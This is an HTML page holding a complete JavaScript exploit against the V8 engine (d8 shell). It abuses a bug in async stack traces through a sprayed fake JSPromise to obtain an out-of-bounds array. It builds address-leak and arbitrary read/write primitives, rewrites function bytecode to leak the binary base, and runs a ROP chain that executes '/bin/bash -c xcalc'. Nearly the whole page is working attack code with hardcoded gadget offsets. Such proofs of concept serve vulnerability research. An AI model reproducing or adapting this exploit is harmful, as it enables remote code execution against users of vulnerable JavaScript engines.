<html>
<body>
<script>

function assert(val) {
    if (!val)
        throw "Assertion Failed";
}

class Helpers {
    constructor() {
        this.buf = new ArrayBuffer(8);
        this.dv = new DataView(this.buf);
        this.u8 = new Uint8Array(this.buf);
        this.u32 = new Uint32Array(this.buf);
        this.u64 = new BigUint64Array(this.buf);
        this.f32 = new Float32Array(this.buf);
        this.f64 = new Float64Array(this.buf);
        this.index = 0;
    }

    pair_i32_to_f64(p1, p2) {
        this.u32[0] = p1;
        this.u32[1] = p2;
        return this.f64[0];
    }

    i64tof64(i) {
        this.u64[0] = i;
        return this.f64[0];
    }

    f64toi64(f) {
        this.f64[0] = f;
        return this.u64[0];
    }

    set_i64(i) {
        this.u64[0] = i;
    }

    set_l(i) {
        this.u32[0] = i;
    }

    set_h(i) {
        this.u32[1] = i;
    }

    get_i64() {
        return this.u64[0];
    }

    ftoil(f) {
        this.f64[0] = f;
        return this.u32[0]
    }

    ftoih(f) {
        this.f64[0] = f;
        return this.u32[1]
    }

    mark_sweep_gc() {
        new ArrayBuffer(0x7fe00000);
    }

    scavenge_gc() {
        for (var i = 0; i < 8; i++) {
            this.add_ref(new ArrayBuffer(0x200000));
        }
        this.add_ref(new ArrayBuffer(8));
    }
    trap() {
        while (1) {
        }
    }
}

const fakeStack2 = new BigUint64Array(0x1000);

var helper = new Helpers();

function hex(x) {
    return `0x${x.toString(16)}`;
}

const sloppy_func_addr = 0x004fa21;
const fake_objs_elems_addr = 0x004fb0d;
const oob_arr_draft_elem_addr = 0x004fb95;

const sloppy_func = () => {};

const fake_objs = new Array(
    /* +0x08 */ helper.pair_i32_to_f64(0x00190485, 0x00000219), // OOB array
    /* +0x10 */ helper.pair_i32_to_f64(oob_arr_draft_elem_addr, 0x42424242),
    /* +0x18 */ helper.pair_i32_to_f64(0x000013cd, 0x00000000), // PromiseReaction  // 0x004fb35
    /* +0x20 */ helper.pair_i32_to_f64(0x00000251, fake_objs_elems_addr + 0x30),
    /* +0x28 */ helper.pair_i32_to_f64(0x00000251, 0x00000251),
    /* +0x30 */ helper.pair_i32_to_f64(0x00184665, 0x00000219), // Function
    /* +0x38 */ helper.pair_i32_to_f64(0x00000219, 0x00043c80),
    /* +0x40 */ helper.pair_i32_to_f64(0x00025575, fake_objs_elems_addr + 0x48),
    /* +0x48 */ helper.pair_i32_to_f64(0x00183e65, 0x43434343), // Context
    /* +0x50 */ helper.pair_i32_to_f64(0x45454545, 0x47474747),
    /* +0x58 */ helper.pair_i32_to_f64(fake_objs_elems_addr + 0x60, 0x0),
    /* +0x60 */ helper.pair_i32_to_f64(0x00199859, 0x00000219), // JSGeneratorObject
    /* +0x68 */ helper.pair_i32_to_f64(0x00000219, sloppy_func_addr),
    /* +0x70 */ helper.pair_i32_to_f64(0x00183e65, fake_objs_elems_addr + 0x8),
    /* +0x78 */ helper.pair_i32_to_f64(0x41414141, 0xdeadbeef),
    /* +0x80 */ helper.pair_i32_to_f64(0x00000000, 0x23232323),
);

const oob_arr_draft = [1.1,];

// elements: 0x4e5c5
var addrOf_arr = [{}, 12.34, 2.3, 2.4, 2.5];

// addrOf: 0x4e655
var aarw_arr = [2.1, 2.2, 2.3, 2.4, 2.5, 2.6, 2.7, 2.8];
var arb = new ArrayBuffer(0x100);

function addrOf(obj) {
    addrOf_arr[0] = obj;
    return helper.ftoil(oob_arr[0x20 / 8]);
}

function arbRead(addr) {
    oob_arr[0xb0 / 8] = helper.pair_i32_to_f64(addr - 8, 0x00000010);
    return helper.f64toi64(aarw_arr[0]);
}

function arbWrite(addr, data) {
    oob_arr[0xb0 / 8] = helper.pair_i32_to_f64(addr - 8, 0x00000010);
    aarw_arr[0] = helper.i64tof64(data);
}

// Spray JSPromise
const jspromise = [
    helper.pair_i32_to_f64(0x0, 0x00192871 << 8),
    helper.pair_i32_to_f64(0x00000219 << 8, 0x00000219 << 8),
    helper.pair_i32_to_f64((fake_objs_elems_addr + 0x18) << 8, 0x0),
];

var xx = new Array(1.1, 1.2);
for (let i = 0; i < 0xc00; i++) {
    xx.push(jspromise[0]);
    xx.push(jspromise[1]);
    xx.push(jspromise[2]);
}
var xx2 = new Array(1.1, 1.2);
for (let i = 0; i < 0xc00; i++) {
    xx2.push(jspromise[0]);
    xx2.push(jspromise[1]);
    xx2.push(jspromise[2]);
}
var xx3 = new Array(1.1, 1.2);
for (let i = 0; i < 0x400; i++) {
    xx3.push(jspromise[0]);
    xx3.push(jspromise[1]);
    xx3.push(jspromise[2]);
}

var oob_arr;

Error.prepareStackTrace = function (error, frames) {
	if (frames.length < 3) {
		console.error("No fake async stack frame");
	} else {
        console.error("I GOT MY FAKE ASYNC STACK FRAME");
		oob_arr = frames[2].getThis();
	}
}

/////////////// Trigger the bug ///////////////

var closure;

function Constructor(executor) {
    executor(()=>{}, ()=>{});
}
Constructor.resolve = function(v) {
    return v;
};

let p1 = {
    then(onFul, onRej) {
        closure = onFul;
        closure(1);
    }
};

async function boo(x) {
    await bar(x).then(closure);
}

async function bar(x) {
    await x;
    throw new Error("Let's have a look...");
}

async function foo() {
    await Promise.all.call(Constructor, [p1]);
	boo(1).catch(e => {
        e.stack;

        if (oob_arr == undefined) {
            console.error("oob fail");
            throw "done.";
        }
        console.info("=============OOB SUCCESS============");

        const d8LeakOffset = 0x5b5fefe4n - 0x55554000n;

        // Below gadgets are offset based on d8 base
        const retOffset =  0x27bf022n;          // ret;
        const popRdiOffset = 0x281787fn;       // pop rdi; ret;
        const popRsiOffset = 0x27f248fn;       // pop rsi; ret;
        const popRdxOffset =  0x280630cn;       // pop rdx; ret;
        const popRaxOffset = 0x292a3d0n;       // pop rax; ret;
        const syscallOffset =  0x27e3ef8n;      // syscall;

        function BytecodeView(fn) {
            const func_addr = addrOf(fn);
            console.error(`func_addr at ${hex(func_addr)}`);
            // SharedFunctionInfo
            const sfi_addr = arbRead(func_addr + 0x10) & 0x00000000FFFFFFFFn;
            console.error(`sfi_addr at ${hex(sfi_addr)}`);
            // NOTE:
            // `BytecodeArray`: *(sfi_addr + 8)
            // It includes metadata and bytecode.
            // 0x20 offset is the start of bytecode.
            const bytecode_addr = (arbRead(Number(sfi_addr)) >> 32n) - 1n + 0x22n;
            console.error(`bytecode_addr at ${hex(bytecode_addr)}`);
            let u8_ab = new ArrayBuffer(0x20);
            // Overwrite backing_store address to bytecode_addr
            arbWrite(addrOf(u8_ab) + 0x20, bytecode_addr << 24n);
            return new Uint8Array(u8_ab);
        }

        function getCageBase() {
            const mv = arbRead(0 + 1 + 3 * 8);
            return (mv & 0xffffffff00000000n);
        }

        let page_offset = arbRead(addrOf(fakeStack2) + 0x30) & 0x0f000000n;

        function getLibcHeapPointer() {
            console.log(" [+] page_offset:", hex(page_offset));

            let victim = new ArrayBuffer(256);
            arbWrite(addrOf(victim) + 0x20, 0x04000000n);   // lower
            arbWrite(addrOf(victim) + 0x24, page_offset | 0x00000010n);   // higher

            let uint32view = new Uint32Array(victim);
            let mv = uint32view[0];
            console.log("Upper:", hex(mv));

            return BigInt(mv) << 32n;
        }

        function hax1(a, b) {
            return a + b + 1;
        }

        hax1();
        console.error("READY");

        const cageBase = getCageBase();
        console.error(`Cage base at ${hex(cageBase)}`);
        const bv = BytecodeView(hax1);

        let i = 0;
        function emit(x) {
            bv[i] = x;
            i++;
        }

        function reset() {
            i = 0;
        }

        reset();
        // LdarExtraWide frame pointer
        emit(1);
        emit(0xb);
        emit(0x01);
        emit(0);
        emit(0);
        emit(0);
        // ret
        emit(0xaa);

        // Builtins_LdarExtraWideHandler
        let d8Leak = hax1() << 1;
        if (d8Leak < 0) {
            d8Leak = 0x100000000 + d8Leak;
        }

        console.error(`d8 leak: ${hex(d8Leak)}`);
        const upper = (getLibcHeapPointer() & 0xffffffff00000000n);
        console.error(`upper: ${hex(upper)}`);
        const d8base = upper + (BigInt(d8Leak) - d8LeakOffset);
        console.error(`d8 at ${hex(d8base)}`);


        // --------------------------------------------------------------------
        // Make fake stack
        // --------------------------------------------------------------------

        const fakeStack = new BigUint64Array(8);
        const fakeStackBuf = (arbRead(addrOf(fakeStack) + 0x30) >> 32n) + 0x7n;
        console.error(`fake stack data at ${hex(fakeStackBuf)}`);


        const fakeBytecode = new Uint8Array(64);
        const fakeBytecodeAddress = cageBase + ((arbRead(addrOf(fakeBytecode) + 0x30) >> 32n) + 0x7n);
        console.error(`fake bytecode at ${hex(fakeBytecodeAddress)}`);

        const fakeStackBuf2 = cageBase + (page_offset << 8n) + 0xc000n;
        console.error(`fake stack data 2 at ${hex(fakeStackBuf2)}`);
        console.error(`fake stack TypedArray at ${hex(cageBase + BigInt(addrOf(fakeStack)) - 1n)}`);

        // r9
        fakeStack[3] = 0n << 9n;
        // r12
        fakeStack[4] = fakeBytecodeAddress << 8n;
        // rcx
        const stackOffset = (fakeStackBuf2 - (cageBase + BigInt(fakeStackBuf) + 5n * 8n)) >> 3n;
        console.error(`Stack offset: ${hex(stackOffset)}`);         // 0x1fff5cef
        fakeStack[5] = stackOffset << 8n;
        fakeStack[6] = 0n;

        fakeBytecode[0] = 0xaa;
        fakeBytecode[0x17 + 3] = 0x0;

        reset();
        // ldar a0
        emit(0xb);
        emit(3);

        // star frame pointer
        emit(24);
        emit(0);

        // ret
        emit(0xaa);

        const rop_i_init = fakeBytecodeAddress % 8n == 0 ? 4 : 3;
        let rop_i = rop_i_init;
        const rop_shift = 8n * (fakeBytecodeAddress % 8n == 0 ? 1n : 5n);
        function rop(x) {
            const val = BigInt(x);
            if (rop_i == rop_i_init) {
                arbWrite(addrOf(fakeStack) + 1 + 0x8, val);
            } else {
                fakeStack2[rop_i] |= val << rop_shift;
                fakeStack2[rop_i + 1] = val >> (64n - rop_shift);
            }
            rop_i++;
        }

        function rebase(x) {
            return d8base + BigInt(x);
        }

        const argv0 = fakeStackBuf2 + 0x800n * 8n;
        const argv1 = fakeStackBuf2 + 0x800n * 8n + 0xAn;
        const argv2 = fakeStackBuf2 + 0x800n * 8n + 0xDn;
        const argv_address = fakeStackBuf2 + 0x900n * 8n;
        const env1 = fakeStackBuf2 + 0x800n * 8n + 0x13n;
        const env_address = fakeStackBuf2 + 0x900n * 8n + 8n*4n;

        //           0123456789ABCDE..
        const cmd = `/bin/bash?-c?xcalc?DISPLAY=:0?`.replaceAll('?', String.fromCharCode([0]));
        const dv = new DataView(fakeStack2.buffer);
        for (let i = 0; i < cmd.length; i++) {
            dv.setUint8(0x800 * 8 + i, cmd.charCodeAt(i));
        }

        fakeStack2[0x900] = argv0;
        fakeStack2[0x901] = argv1;
        fakeStack2[0x902] = argv2;
        fakeStack2[0x903] = 0n;
        fakeStack2[0x904] = env1;
        fakeStack2[0x905] = 0n;

        rop(rebase(retOffset));
        //rop(rebase(0x41414141n))
        // execve("/bin/sh")
        rop(rebase(popRdiOffset));
        rop(argv0);
        rop(rebase(popRsiOffset));
        rop(argv_address);
        rop(rebase(popRdxOffset));
        rop(env_address);
        rop(rebase(popRaxOffset));
        rop(59);
        rop(rebase(syscallOffset));
        hax1(fakeStack);


	});
}

foo();

</script>
</body>
</html>

